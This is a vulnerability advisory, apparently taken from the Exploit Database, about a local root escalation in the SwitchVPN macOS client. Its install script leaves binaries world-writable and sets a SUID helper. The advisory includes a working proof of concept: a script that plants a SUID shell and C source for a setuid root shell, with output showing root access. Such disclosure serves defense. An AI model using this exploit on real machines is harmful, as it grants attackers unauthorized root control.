Vendor description:
-------------------
"By 2015 we were frustrated that the free internet we loved was under
threat.
As experts in online security we believed we could solve this problem. So we
came together as a team to make SwitchVPN, a simple and powerful app to keep
the internet free. SwitchVPN is simple. Install it on your phone, tablet or
laptop, then just switch it on to keep the internet free. SwitchVPN is
powerful.

Source: <https://switchvpn.net/>

Business recommendation:
------------------------
By exploiting the vulnerability documented in this advisory, an attacker
can fully compromise a MacOS system with an installation of the SwitchVPN
client.

Users are urged to uninstall the SwitchVPN client for MacOS until the
issues have
been fixed.

Vulnerability overview/description:
-----------------------------------
1) Privilege Escalation Vulnerability (reserved CVE-2018-18860)

After installation or an update, the script "fix_permissions.sh" is run by
the application. This script changes the owner of the main application
binaries
to root and sets them to world-writable. Additionally, the SUID bit is set
for
another sensitive binary in the application folder. This configuration
makes it
very easy to escalate privileges to root.

After the installation or update of SwitchVPN, the following script is run:

============================================================================================
...
switchvpn_updater.dat
mb:MacOS b$ file switchvpn_updater.dat
switchvpn_updater.dat: Qt Binary Resource file
...
if (systemInfo.kernelType === "darwin") {
  console.log("Run permissions\n");
  component.addElevatedOperation("Execute",
"/Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/fix_permissions.sh");
}
...
============================================================================================
mb:MacOS b$ cat fix_permissions.sh
#!/bin/sh

chown -R root /Applications/SwitchVPN/SwitchVPN.app/
chgrp -R admin /Applications/SwitchVPN/SwitchVPN.app/
chmod -R 777 /Applications/SwitchVPN/SwitchVPN.app/
chmod -R u+s /Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/compose8
============================================================================================

This leads to an overpermissive application configuration:

============================================================================================
mb:MacOS b$ ls -al
total 18720
drwxrwxrwx  35 root  admin     1120 Sep 29 20:39 .
drwxrwxrwx  16 root  admin      512 Sep 29 20:39 ..

-r-xr-xr-x   1 root  wheel    19056 Oct 12  2017 compose9
-r-xr-xr-x   1 root  wheel   132160 Oct 12  2017 composec
-r-xr-xr-x   1 root  wheel   510464 Oct 12  2017 composecn
-r-xr-xr-x   1 root  wheel     5632 Oct 12  2017 down.sh
-rwxrwxrwx   1 root  admin      245 Oct 12  2017 fix_permissions.sh
-rw-r--r--   1 root  admin       56 Sep 29 20:39 log.txt
-r-xr-xr-x   1 root  wheel    39050 Oct 12  2017 up.sh
============================================================================================

Further investigation shows, that the "SwitchVPN_GUI" binary is run as root:

============================================================================================
mb:MacOS b$ ps aux | grep -i switch
root             15165   4.6  0.4  4515952  72912   ??  S     8:39PM
 0:08.84 SwitchVPN_GUI
============================================================================================

After statically analysing the "SwitchVPN" binary, it became clear, that it
runs the "compose8" SUID root binary. Further analysis showed, that
"compose8"
subsequently runs the "SwitchVPN_GUI" binary and since it's world-writable,
an
attacker can exploit the situation to escalate privileges.

============================================================================================
# SwitchVPN -> compose8
...add     rdx, [rdx+10h]
lea     rsi, aCompose8_0 ; "compose8"
lea     rcx, aSwitchvpn ; "SwitchVPN"
xor     r9d, r9d
xor     eax, eax
mov     rdi, rbx        ; char *
mov     r8, r14
call    _execl
...
============================================================================================

============================================================================================
# compose8 -> SwitchVPN_GUI
...
lea     rsi, aCompose8WillIn ; "Compose8 will invoke GUI app %s, %s\n"
xor     eax, eax
mov     rdx, rbx
mov     rcx, r12
call    _fprintf
cmp     r15d, 4
lea     rdx, aB         ; "-b"
cmovnz  rdx, r14
xor     ecx, ecx
xor     eax, eax
mov     rdi, rbx        ; char *
mov     rsi, r12        ; char *
call    _execl
...
============================================================================================

Running the "SwitchVPN" binary from the command line confirms the issue:

============================================================================================
./SwitchVPN
This app (compose8) invoked with args:
/Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS, SwitchVPN
Compose8 will invoke GUI app
/Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/SwitchVPN_GUI,
SwitchVPN_GUI
============================================================================================

Proof of concept:
-----------------
1) Privilege Escalation Vulnerability
A situation like the one described above provides a wide range of
possibilities for escalating privileges to root. A quick and easy way is to
write the following shell script to "SwitchVPN_GUI":

============================================================================================
#!/bin/bash
chown root /tmp/shell
chmod 4755 /tmp/shell
============================================================================================

Create and compile the following execve() based shell:

============================================================================================
#include <stdlib.h>
#include <unistd.h>
main () {
  setuid(0);
  seteuid(0);
  setgid(0);
  execve("/bin/sh", 0, 0);
}

gcc shell.c -o shell
============================================================================================

Copy the shell binary to an attacker controlled location (e.g. /tmp).
Start the "SwitchVPN.app" as a local, unprivileged user. Afterwards the
execution of /tmp/shell will drop the user/attacker to a root shell:

============================================================================================
-rwsr-xr-x   1 root  wheel    8576 Sep 29 20:34 shell
-rw-r--r--   1 b     wheel     127 Sep 29 20:33 shell.c

bash-3.2$ whoami
b
bash-3.2$ ./shell
bash-3.2# whoami
root
============================================================================================

-----------------------------
The following version has been tested and found to be vulnerable: 2.1012.03.
Earlier versions might be vulnerable as well.

the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
